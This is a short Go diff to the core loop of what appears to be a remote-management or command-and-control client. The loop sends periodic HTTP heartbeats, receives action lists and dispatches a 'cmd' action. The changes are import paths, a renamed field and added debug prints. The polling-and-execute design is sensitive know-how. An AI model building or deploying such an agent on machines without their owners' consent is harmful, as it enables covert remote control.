@@ -1,13 +1,13 @@
 package core
 
 import (
-	"C/config"
-	"C/shell"
-	"C/utils"
+	"github.com/9bie/manager/Client/config"
+	"github.com/9bie/manager/Client/shell"
+	"github.com/9bie/manager/Client/utils"
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
-	//"fmt"
+	"fmt"
 	"io/ioutil"
 	//"log"
 	"net/http"
@@ -48,7 +48,7 @@ func (c *Core) Pool() {
 	for {
 		time.Sleep(time.Duration(c.sleep) * time.Second)
 		
-		data := Heartbeat{Uuid: c.uuid, Event: c.event, Info: c.info, Sleep: c.sleep}
+		data := Heartbeat{Uuid: c.uuid, Result: c.event, Info: c.info, Sleep: c.sleep}
 		c.event = nil
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
@@ -71,11 +71,14 @@ func (c *Core) Pool() {
 
 
 		var action []Action
+		fmt.Println(string(body))
 		err = json.Unmarshal(body, &action)
 		if err != nil {
-			continue
+			fmt.Println(string(err.Error()))
+			
 		}
 		for _, i := range action {
+
 			switch i.Do {
 			case "cmd":
 
